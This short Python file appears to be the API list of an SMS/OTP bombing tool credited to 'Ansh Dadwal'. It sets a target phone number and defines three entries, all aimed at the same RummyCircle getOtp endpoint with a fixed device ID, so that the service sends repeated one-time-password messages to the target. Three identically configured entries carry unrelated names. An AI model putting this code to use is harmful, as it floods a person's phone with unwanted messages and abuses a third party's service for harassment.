target = 9876448998
# Credits to Ansh Dadwal
target = str(target)
true = "true"
false = "false"

apidata = {

"Mater":(f"https://www.rummycircle.com/api/fl/auth/v3/getOtp",{"mobile":target,"deviceId":"d6be3862-7659-46c0-98b9-3d13328a243c","deviceName":"","refCode":"","isPlaycircle":"false"},{},"POST",'''success":true'''),

"Rummycircle":(f"https://www.rummycircle.com/api/fl/auth/v3/getOtp",{"mobile":target,"deviceId":"d6be3862-7659-46c0-98b9-3d13328a243c","deviceName":"","refCode":"","isPlaycircle":"false"},{},"POST",'''success":true'''),

"Land":(f"https://www.rummycircle.com/api/fl/auth/v3/getOtp",{"mobile":target,"deviceId":"d6be3862-7659-46c0-98b9-3d13328a243c","deviceName":"","refCode":"","isPlaycircle":"false"},{},"POST",'''success":true'''),


}


apis = [

apidata["Mater"],
apidata["Rummycircle"],
apidata["Land"]
]
